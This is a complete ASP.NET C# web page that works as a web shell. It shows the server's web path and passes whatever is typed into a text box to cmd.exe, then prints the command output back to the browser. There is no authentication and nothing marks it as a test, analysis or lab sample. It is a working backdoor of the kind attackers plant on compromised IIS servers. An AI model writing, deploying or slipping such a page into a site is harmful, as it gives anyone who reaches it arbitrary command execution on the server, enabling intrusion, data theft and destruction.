<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
    txt_WebPath.Text = Server.MapPath(".");
}
string ExcuteCmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
    cmdResult.Text = cmdResult.Text + Server.HtmlEncode(ExcuteCmd(txt_cmd.Text));    
}
</script>
<HTML><body ><form id="cmd" method="post" runat="server">
    <br />
    WebPath:
    <asp:TextBox ID="txt_WebPath" runat="server" Width="579px"></asp:TextBox>
&nbsp; <br />
    <br />
<asp:Label ID="Label2" runat="server" Text="Commond: "></asp:Label>
<asp:TextBox ID="txt_cmd" runat="server" Width="581px"></asp:TextBox>&nbsp;
<asp:Button ID="Button1" runat="server" onclick="cmdExe_Click" Text="Execute" /><br /><br />
<asp:TextBox ID="cmdResult" runat="server" Height="662px" Width="798px" TextMode="MultiLine"></asp:TextBox>
</form></body></HTML>
